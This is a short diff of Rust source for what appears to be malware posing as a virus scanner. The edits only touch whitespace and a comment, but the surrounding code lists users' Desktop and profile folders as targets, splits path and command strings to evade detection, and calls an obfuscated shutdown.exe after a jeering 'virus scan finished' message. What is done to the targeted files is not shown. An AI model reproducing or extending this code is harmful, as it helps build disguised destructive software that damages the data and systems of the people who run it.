@@ -39,9 +39,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
 
         let targets = [
             //user related folder and files
-            format!("C:\\Users\\%USERPROFILE%\\Deskt{}", "op\\"), 
-                                                                
-                                                                
+            format!("C:\\Users\\%USERPROFILE%\\Deskt{}", "op\\"),                                                                                                               
             format!("C:\\Users\\Pu{}", "blic\\Desktop\\"),
 
             format!("C:\\Us{}", "ers\\"),               
@@ -71,7 +69,6 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
 
         for target_str_fmt in &targets {
             let target_path = Path::new(target_str_fmt);
-
 
             println!("[+] Attempting to scan(wink): {}", target_path.display());
 
@@ -109,7 +106,6 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         
         println!("\n[+] virus scan finished lol. bye bye mf!");
 
-        // Reboot system (command string obfuscated)
         let shutdown_cmd_p1 = "shutd";
         let shutdown_cmd_p2 = "own.exe";
         let full_shutdown_cmd = format!("{}{}", shutdown_cmd_p1, shutdown_cmd_p2);
